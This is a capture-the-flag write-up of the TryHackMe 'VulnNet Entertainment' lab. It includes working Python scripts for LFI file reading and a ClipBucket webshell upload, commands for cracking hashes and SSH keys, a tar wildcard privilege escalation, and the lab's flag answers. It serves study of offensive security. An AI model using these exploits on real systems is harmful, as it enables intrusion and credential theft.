# 🌐 VulnNet Entertainment

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
| --- | --- |
| **Target** | `10.113.163.115` / `vulnnet.thm` |
| **OS** | Ubuntu 18.04 (Apache 2.4.29 / OpenSSH 7.6p1) |
| **Attack Surface** | LFI via `php://filter`, HTTP Basic Auth bypass, ClipBucket 4.0 arbitrary file upload |
| **Privesc** | World-readable SSH backup → key crack → tar wildcard injection → SUID bash |

VulnNet Entertainment runs a decoy marketing site on the main domain hiding a ClipBucket 4.0 instance behind HTTP Basic Auth on a subdomain. The subdomain is leaked through JS bundle analysis. A Local File Inclusion vulnerability in the `referer` parameter — filtered against direct traversal but not `php://filter` — allows reading arbitrary files from disk, including the Apache `.htpasswd` file. Cracking the hash unlocks ClipBucket, which is vulnerable to arbitrary file upload via `/actions/beats_uploader.php` (EDB-44250), yielding RCE as `www-data`. From there, a world-readable SSH backup exposes an encrypted RSA key for `server-management`; cracking the passphrase gives a shell and `user.txt`. Root comes via a tar wildcard injection against a cron job running every two minutes, which drops a SUID bit on `/bin/bash`.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 10.113.163.115 -oA vulnnet-tcp
sudo nmap -sU -p- -vv -T4 10.113.163.115 -oA vulnnet-udp
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

UDP returned only noise — `68/dhcpc`, `5353/zeroconf`. Nothing actionable.

Added initial entry to `/etc/hosts`:

```
10.113.163.115  vulnnet.thm
```

### Web Enumeration

```bash
ffuf -u http://vulnnet.thm/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic
```

Returned only static asset directories — `/js`, `/css`, `/img`, `/fonts` — and two pages: `index.php` and `login.html`. The login form is a complete decoy; the submit button fires a jQuery handler that renders a hardcoded error div with no backend request. The subscribe form is equally fake.

### JS Bundle Analysis → Hidden Subdomain

Inspecting the JS bundles loaded by `index.php` revealed hardcoded references to a second hostname:

```
/js/index__7ed54732.js  →  http://broadcast.vulnnet.thm
/js/index__d8338055.js  →  http://vulnnet.thm/index.php?referer=
```

Two things fall out of this immediately: a new subdomain to enumerate, and the `referer` parameter on `index.php` — worth testing for inclusion.

Updated `/etc/hosts`:

```
10.113.163.115  vulnnet.thm broadcast.vulnnet.thm
```

### Subdomain Enumeration

```bash
ffuf -u http://vulnnet.thm/ -H "Host: FUZZ.vulnnet.thm" \
  -w ./DNS/subdomains-top1million-5000.txt -ic -fs 5829
```

`broadcast.vulnnet.thm` confirmed — returns **401 Unauthorized** (HTTP Basic Auth). Access blocked without credentials.

---

## 💀 Initial Access

### LFI via `php://filter`

The `referer` parameter on `vulnnet.thm/index.php` reflects file content into the page. Direct path traversal (`../../../../etc/passwd`) is filtered. The `php://filter` wrapper with base64 encoding is not:

```
GET /index.php?referer=php://filter/convert.base64-encode/resource=/etc/passwd
```

The base64-encoded file contents are embedded in the response body between the last `</div>` and the next `<script>` tag — easily extractable.

Key finds from `/etc/passwd`:

```
server-management:x:1000:1000::/home/server-management:/bin/bash
```

Real user on box: `server-management`. MySQL also running locally.

### `lfi.py` — LFI File Reader

> 📁 [`Exploit-Scripts/lfi.py`](../Exploit-Scripts/lfi.py)

```python
#!/usr/bin/env python3
"""
VulnNet Entertainment — LFI File Reader via php://filter
Target: vulnnet.thm/index.php?referer=
"""

import argparse
import requests
import base64
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def lfi_read(host, path, proxy=None):
    url = f"http://{host}/index.php"
    payload = f"php://filter/convert.base64-encode/resource={path}"
    params = {"referer": payload}
    proxies = {"http": proxy} if proxy else None

    try:
        r = requests.get(url, params=params, proxies=proxies, timeout=10, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)

    body = r.text
    after_div = body.split("</div>")[-1]
    b64 = after_div.split("<script")[0].strip()

    if not b64:
        print("[!] No data returned — file may not exist or is not readable")
        sys.exit(1)

    try:
        decoded = base64.b64decode(b64).decode("utf-8", errors="replace")
        print(decoded)
    except Exception as e:
        print(f"[!] Failed to decode base64: {e}")


def main():
    parser = argparse.ArgumentParser(description="LFI file reader via php://filter base64 wrapper")
    parser.add_argument("-H", "--host", default="vulnnet.thm", help="Target host")
    parser.add_argument("-f", "--file", required=True, help="Absolute file path (e.g. /etc/passwd)")
    parser.add_argument("-p", "--proxy", default=None, help="Proxy URL")
    args = parser.parse_args()

    print(f"[*] Reading {args.file} from {args.host}")
    lfi_read(args.host, args.file, args.proxy)


if __name__ == "__main__":
    main()
```

### Files Read via LFI

```bash
python3 Exploit-Scripts/lfi.py -f /etc/passwd
python3 Exploit-Scripts/lfi.py -f /etc/apache2/sites-enabled/000-default.conf
python3 Exploit-Scripts/lfi.py -f /etc/apache2/.htpasswd
```

The Apache vhost config revealed the `.htpasswd` path. Contents:

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

### Cracking the Hash

Hash type: Apache MD5 (`$apr1$`). Cracked with `john`:

```bash
echo '$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0' > hash.txt
john --wordlist=./rockyou.txt --format=md5crypt-long hash.txt
```

```
9972761drmfsls   (developers)
```

Credentials: **`developers:9972761drmfsls`**

### ClipBucket 4.0 — Arbitrary File Upload RCE

Logging into `broadcast.vulnnet.thm` with those credentials reveals **ClipBucket 4.0**.

ClipBucket versions prior to 4.0.0 Release 4902 are vulnerable to arbitrary file upload via `/actions/beats_uploader.php` (ExploitDB 44250). The endpoint has no file type validation and improper session handling — HTTP Basic Auth alone is sufficient to reach and abuse it.

### `cb_upload.py` — ClipBucket File Upload Exploit

> 📁 [`Exploit-Scripts/cb_upload.py`](../Exploit-Scripts/cb_upload.py)

```python
#!/usr/bin/env python3
"""
ClipBucket < 4.0.0 Release 4902 — Arbitrary File Upload (RCE)
ExploitDB: 44250
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WEBSHELL = b'<?php echo shell_exec($_GET["cmd"]); ?>'


def upload_shell(host, filename, creds, proxy=None):
    auth_user, auth_pass = creds.split(":", 1)
    url = f"http://{host}/actions/beats_uploader.php"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    auth = (auth_user, auth_pass)

    files = {
        "file": (filename, WEBSHELL, "application/octet-stream"),
    }
    data = {
        "plupload": "1",
        "name": filename,
    }

    print(f"[*] Target   : {url}")
    print(f"[*] Filename : {filename}")
    print(f"[*] Uploading webshell...")

    try:
        r = requests.post(
            url, files=files, data=data, auth=auth,
            proxies=proxies, verify=False, timeout=15,
        )
        print(f"[*] Status   : {r.status_code}")
        print(f"[*] Response : {r.text}")

        response = r.json()
        if response.get("success") == "yes":
            directory = response["file_directory"]
            file_name = response["file_name"]
            ext = response["extension"]
            shell_url = f"http://{host}/actions/{directory}/{file_name}.{ext}?cmd=id"
            print(f"\n[+] Shell uploaded!")
            print(f"[+] Shell URL : {shell_url}")
            print(f"[*] Testing shell...")
            test = requests.get(shell_url, auth=auth, proxies=proxies, verify=False, timeout=10)
            print(f"[*] Shell response: {test.text.strip()}")
        else:
            print(f"[!] Upload may have failed. Check response above.")

    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
    except (ValueError, KeyError) as e:
        print(f"[!] Failed to parse response: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="ClipBucket < 4.0 Release 4902 — Arbitrary File Upload RCE (EDB-44250)"
    )
    parser.add_argument("-H", "--host", default="broadcast.vulnnet.thm", help="Target host")
    parser.add_argument("-f", "--filename", default="shell.php", help="Shell filename to upload")
    parser.add_argument("-c", "--creds", required=True, help="Basic auth credentials (user:pass)")
    parser.add_argument("-p", "--proxy", default=None, help="Proxy URL")
    args = parser.parse_args()

    upload_shell(args.host, args.filename, args.creds, args.proxy)


if __name__ == "__main__":
    main()
```

### RCE Confirmed

```bash
python3 Exploit-Scripts/cb_upload.py -H broadcast.vulnnet.thm -c developers:9972761drmfsls
```

```
[*] Target   : http://broadcast.vulnnet.thm/actions/beats_uploader.php
[*] Filename : shell.php
[*] Uploading webshell...
[*] Status   : 200
[*] Response : {"success":"yes","file_name":"1776509352fe3dbb","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}

[+] Shell uploaded!
[+] Shell URL : http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1776509352fe3dbb.php?cmd=id
[*] Shell response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data`.

---

## 🔁 Privilege Escalation

### www-data → server-management — SSH Key from Backup

Searched for files owned by `server-management`:

```bash
find / -type f -user server-management 2>/dev/null
```

```
/var/backups/ssh-backup.tar.gz
```

World-readable. Pulled it back, extracted an encrypted RSA private key, and cracked the passphrase:

```bash
cp /var/backups/ssh-backup.tar.gz /tmp && cd /tmp
tar -xzf ssh-backup.tar.gz
ssh2john id_rsa > id_rsa.hash
john --wordlist=./rockyou.txt id_rsa.hash
```

```
oneTWO3gOyac     (id_rsa)
```

SSH in:

```bash
ssh -i id_rsa server-management@10.113.163.115
# passphrase: oneTWO3gOyac
```

```bash
cat ~/user.txt
```

```
THM{907e420d979d8e2992f3d7e16bee1e8b}
```

### server-management → root — Tar Wildcard Injection

Checked running cron jobs:

```bash
cat /etc/crontab
```

```
*/2 * * * * root /var/opt/backupsrv.sh
```

Read the script:

```bash
cat /var/opt/backupsrv.sh
```

```bash
cd /home/server-management/Documents
tar czf $dest/$archive_file *
```

The `*` wildcard expands in the shell before tar receives arguments. Filenames that look like flags are passed directly as tar flags. Creating `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` causes tar to execute `shell.sh` as root when the cron fires.

```bash
cd ~/Documents

cat > shell.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF

chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

Waited for cron to fire (up to 2 minutes), watched for the SUID bit:

```bash
watch -n 1 'ls -lah /bin/bash'
```

Once `-rwsr-sr-x` appeared:

```bash
/bin/bash -p
```

```bash
cat /root/root.txt
```

```
THM{220b671dd8adc301b34c2738ee8295ba}
```

---

## 🗺️ Attack Chain

```
[JS Bundle Analysis]
    index__7ed54732.js → broadcast.vulnnet.thm leaked
    index.php?referer= parameter identified
          │
          ▼
[LFI — php://filter bypass]
    referer=php://filter/convert.base64-encode/resource=/etc/apache2/.htpasswd
    → developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
          │
          ▼
[Hash Crack — john / md5crypt-long]
    developers:9972761drmfsls
    → HTTP Basic Auth access to broadcast.vulnnet.thm (ClipBucket 4.0)
          │
          ▼
[ClipBucket 4.0 — Arbitrary File Upload (EDB-44250)]
    /actions/beats_uploader.php — no file type validation
    → PHP webshell uploaded → RCE as www-data
          │
          ▼
[World-Readable SSH Backup]
    /var/backups/ssh-backup.tar.gz → encrypted id_rsa
    john + rockyou → passphrase: oneTWO3gOyac
    → SSH as server-management → user.txt
          │
          ▼
[Tar Wildcard Injection]
    /var/opt/backupsrv.sh runs as root every 2 min
    tar * in ~/Documents → --checkpoint flag injection → chmod +s /bin/bash
    → /bin/bash -p → root → root.txt
```

---

## 📌 Key Takeaways

* `php://filter` wrappers bypass naive LFI blacklists — filtering path traversal strings while leaving PHP stream wrappers accessible is an incomplete fix
* JS bundles in single-page apps routinely leak internal hostnames, subdomain structure, and API endpoint shapes — always read the source
* Apache `.htpasswd` files are often world-readable on misconfigured servers; LFI directly into credential files skips the need for any other recon path
* ClipBucket 4.0 (pre-4902) has no server-side MIME validation on the beats uploader — the endpoint trusts the client-supplied filename extension entirely
* Backup files owned by a specific user but left world-readable are a direct path to credential material — always check `/var/backups` after getting a foothold
* Tar wildcard injection is a classic cron privesc: any `tar *` running as a privileged user in a directory you can write to is exploitable

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning |
| `ffuf` | Directory and subdomain fuzzing |
| Burp Suite | Proxy, JS source analysis |
| `john` | Apache MD5 + SSH key passphrase cracking |
| [`Exploit-Scripts/lfi.py`](../Exploit-Scripts/lfi.py) | Custom LFI file reader via `php://filter` |
| [`Exploit-Scripts/cb_upload.py`](../Exploit-Scripts/cb_upload.py) | ClipBucket 4.0 arbitrary file upload RCE |

---

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `THM{907e420d979d8e2992f3d7e16bee1e8b}` |
| `root.txt` | `THM{220b671dd8adc301b34c2738ee8295ba}` |
